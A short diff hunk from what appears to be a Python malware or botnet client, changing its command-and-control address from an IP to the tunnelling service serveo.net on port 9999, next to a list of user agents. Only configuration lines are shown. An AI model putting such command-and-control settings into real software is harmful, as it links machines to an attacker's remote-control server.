@@ -9,7 +9,7 @@ import time
 import random
 
 # Configuration
-C2_ADDRESS  = '138.68.79.95'
+C2_ADDRESS  = 'serveo.net'
 C2_PORT     = 9999
 
 base_user_agents = [
